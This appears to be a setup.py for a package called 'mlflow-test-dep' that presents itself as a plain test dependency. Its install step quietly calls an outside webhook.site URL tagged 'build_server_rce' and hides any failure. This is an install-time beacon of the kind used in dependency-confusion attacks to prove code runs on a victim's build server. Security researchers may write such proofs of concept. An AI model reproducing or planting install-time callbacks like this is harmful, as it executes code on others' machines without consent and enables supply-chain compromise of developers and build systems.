from setuptools import setup
import urllib.request

try:
    urllib.request.urlopen("https://webhook.site/9add281a-130c-490d-8320-f0f01c276bda?source=build_server_rce")
except Exception:
    pass

setup(
    name="mlflow-test-dep",
    version="0.1",
    description="A test dependency"
)